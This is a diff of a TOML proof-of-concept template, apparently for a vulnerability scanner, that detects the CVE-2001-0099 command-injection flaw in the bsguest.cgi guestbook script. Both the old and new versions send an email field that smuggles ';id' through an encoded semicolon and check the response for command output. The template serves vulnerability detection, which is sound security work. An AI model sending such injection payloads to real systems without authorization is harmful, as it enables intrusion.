@@ -1,37 +1,26 @@
 [info]
-author = "AVE"
-description = "检测 bsguest.cgi 留言簿脚本是否对 email 字段中的 shell 元字符（分号）进行过滤。通过向脚本提交包含命令注入的恶意邮件地址，验证是否存在远程命令执行漏洞。"
+author = "ave"
+description = "验证 bsguest.cgi guestbook 脚本的远程命令执行漏洞，通过在 email 参数中注入 shell 元字符执行 id 命令并检测输出"
 id = "POC-AVE-2001-0042"
-name = "CVE-2001-0099 PoC"
+name = "Brian Stanback bsguest.cgi Remote Command Execution PoC"
 severity = "critical"
-tags = ["cve-2001-0099"]
+tags = ["ave-2001-0042"]
 vuln_id = [
     "CVE-2001-0099",
     "AVE-2001-0042",
 ]
 
 [poc]
-logic = "any"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/bsguest.cgi?name=test&email=hacker@example.com%3Bid&comment=test"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["uid="]
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/bsguest.cgi"
+path = "/{{BaseURL}}/bsguest.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "name=test&email=hacker@example.com%3Bid&comment=test"
-type = "raw"
+content = "name=AVE+Test&email=test%40example.com%3bid%3b&comment=test&submit=Submit"
+type = "form"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
